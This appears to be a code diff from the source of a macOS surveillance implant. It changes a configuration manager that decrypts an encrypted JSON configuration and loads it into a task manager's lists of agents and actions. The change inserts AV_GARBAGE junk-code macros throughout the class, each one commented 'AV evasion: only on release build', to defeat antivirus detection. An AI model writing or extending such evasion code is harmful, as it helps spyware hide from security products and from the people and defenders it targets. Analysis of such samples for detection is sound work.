@@ -24,6 +24,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 #pragma mark -
 #pragma mark Private Interface
@@ -366,6 +367,9 @@
 {
   self = [super init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (self != nil)
     {
 #ifdef DEV_MODE
@@ -381,8 +385,14 @@
                                     length: CC_MD5_DIGEST_LENGTH];
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       mEncryption = [[__m_MEncryption alloc] initWithKey: temp];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return self;
 }
@@ -390,6 +400,9 @@
 - (void)dealloc
 {
   [mEncryption release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [super dealloc];
 }
@@ -400,8 +413,14 @@
   // FIXED-
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   // configuration retained by decryptJSonConfiguration
   NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if (configuration == nil) 
   {
@@ -411,7 +430,13 @@
   else // FIXED-
     [configuration release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   return YES;
 }
@@ -420,15 +445,30 @@
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                  [[NSBundle mainBundle] bundlePath],
                                  gConfigurationName];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [configurationFile release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (configuration == nil)
     {
@@ -436,11 +476,20 @@
       [pool release];
       return NO;
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // For safety we remove all the previous objects
   [taskManager removeAllElements];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   // Running the parser and populate the lists
   BOOL bRet = [jSonDel runParser: configuration 
@@ -448,10 +497,19 @@
                       andActions: [taskManager mActionsList] 
                       andModules: [taskManager mAgentsList]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [jSonDel release];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   //FIXED-
   [configuration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [pool release];
   
@@ -459,7 +517,10 @@
 }
 
 - (__m_MEncryption *)encryption
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return mEncryption;
 }
 
